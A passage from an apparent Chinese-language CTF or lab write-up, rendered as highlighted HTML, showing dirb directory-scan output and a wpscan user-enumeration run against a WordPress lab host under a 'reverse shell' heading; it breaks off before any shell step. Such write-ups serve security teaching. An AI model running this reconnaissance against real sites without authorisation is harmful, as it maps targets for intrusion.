+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">js</span><span class="o">/</span>                     
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">maint</span><span class="o">/</span>                  
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">network</span><span class="o">/</span>                
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">user</span><span class="o">/</span>                   
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>        
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span>              
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span>               
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">upgrade</span><span class="o">/</span>              
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span>              
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">includes</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">css</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">images</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">includes</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">js</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">maint</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">network</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">network</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">network</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">user</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">503</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">2545</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">503</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">2545</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">upgrade</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="ne">Directory</span> <span class="n">IS</span> <span class="n">LISTABLE</span><span class="o">.</span> <span class="n">No</span> <span class="n">need</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span><span class="o">.</span>                        
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Use</span> <span class="n">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">-----------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">END_TIME</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">17</span> <span class="mi">11</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">24</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl"><span class="n">DOWNLOADED</span><span class="p">:</span> <span class="mi">36896</span> <span class="o">-</span> <span class="n">FOUND</span><span class="p">:</span> <span class="mi">13</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="反弹shell">反弹shell</h3>
+<p>有wp网站，wpscan扫一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">wpscan</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span> <span class="o">--</span><span class="n">api</span><span class="o">-</span><span class="n">token</span><span class="o">=*</span> <span class="o">-</span><span class="n">e</span> <span class="n">u</span>
+</span></span><span class="line"><span class="cl"><span class="n">_______________________________________________________________</span>
+</span></span><span class="line"><span class="cl">         <span class="n">__</span>          <span class="n">_______</span>   <span class="n">_____</span>
+</span></span><span class="line"><span class="cl">         \ \        <span class="o">/</span> <span class="o">/</span>  <span class="n">__</span> \ <span class="o">/</span> <span class="n">____</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">          \ \  <span class="o">/</span>\  <span class="o">/</span> <span class="o">/|</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">___</span>   <span class="n">___</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span> <span class="err">®</span>
+</span></span><span class="line"><span class="cl">           \ \<span class="o">/</span>  \<span class="o">/</span> <span class="o">/</span> <span class="o">|</span>  <span class="n">___</span><span class="o">/</span> \<span class="n">___</span> \ <span class="o">/</span> <span class="n">__</span><span class="o">|/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span> <span class="s1">&#39;_ </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |</span>
+</span></span><span class="line"><span class="cl">             \<span class="o">/</span>  \<span class="o">/</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span>    <span class="o">|</span><span class="n">_____</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="n">WordPress</span> <span class="n">Security</span> <span class="n">Scanner</span> <span class="n">by</span> <span class="n">the</span> <span class="n">WPScan</span> <span class="n">Team</span>
+</span></span><span class="line"><span class="cl">                         <span class="n">Version</span> <span class="mf">3.8</span><span class="o">.</span><span class="mi">27</span>
+</span></span><span class="line"><span class="cl">       <span class="n">Sponsored</span> <span class="n">by</span> <span class="n">Automattic</span> <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">automattic</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">       <span class="err">@</span><span class="n">_WPScan_</span><span class="p">,</span> <span class="err">@</span><span class="n">ethicalhack3r</span><span class="p">,</span> <span class="err">@</span><span class="n">erwan_lr</span><span class="p">,</span> <span class="err">@</span><span class="n">firefart</span>
+</span></span><span class="line"><span class="cl"><span class="n">_______________________________________________________________</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span> <span class="p">[</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Started</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">58</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Interesting</span> <span class="n">Finding</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Headers</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Interesting</span> <span class="n">Entry</span><span class="p">:</span> <span class="n">Server</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">57</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Headers</span> <span class="p">(</span><span class="n">Passive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Confidence</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">XML</span><span class="o">-</span><span class="n">RPC</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">be</span> <span class="n">enabled</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Direct</span> <span class="n">Access</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Confidence</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">References</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">codex</span><span class="o">.</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">XML</span><span class="o">-</span><span class="n">RPC_Pingback_API</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">rapid7</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">wordpress_ghost_scanner</span><span class="o">/</span>
